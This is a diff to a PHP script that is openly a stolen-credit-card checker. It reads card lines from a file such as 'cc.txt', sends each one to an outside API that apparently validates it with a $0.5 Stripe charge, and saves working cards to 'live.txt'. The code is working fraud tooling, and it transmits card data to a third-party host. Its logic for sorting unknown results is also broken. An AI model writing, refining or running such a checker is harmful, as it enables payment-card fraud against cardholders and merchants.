@@ -1,7 +1,10 @@
 <?php
-
+echo "\n";
+echo "=========================\n";
+echo "Merchant Stripe Charge $0.5\n";
+echo "=========================\n\n\n";
 do {
-  $pathFile = input("Path File List");
+  $pathFile = input("Path File List (example : cc.txt)");
   if(empty($pathFile)) {
     $initiateRepeat = 1;
   } else if(!file_exists($pathFile)) {
@@ -18,13 +21,13 @@ $amountList = count($delimeter);
 
 foreach($delimeter as $format) {
 $format = trim($format);
-    $response = file_get_contents("http://punyagw.my.id/api/?format=".trim($format));
-    if(json_decode($response,1)['status'] == "LIVE") {
+    $response = file_get_contents("https://punyagw.my.id/lol/?format=".trim($format));
+    if(json_decode($response,1)['status'] == "200") {
       echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." - ".@json_decode($response,1)['bin_info']." => LIVE\n";
-      file_put_contents("liveCC.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
+      file_put_contents("live.txt", $format." ".json_decode($response,1)['bin_info']."\n", FILE_APPEND);
     } else {
       echo "[".date("Y-m-d H:i:s")."] [".$checkTotal."/".$amountList."] ".$format." => DIE ".json_decode($response,1)['message']."\n";
-	  if(json_decode($response,1)['status'] !== "DIE" || json_decode($response,1)['status'] !== "LIVE") {
+    if(json_decode($response,1)['status'] !== "402" || json_decode($response,1)['status'] !== "200") {
         file_put_contents("unk.txt", $format."\n", FILE_APPEND);
       }
   }
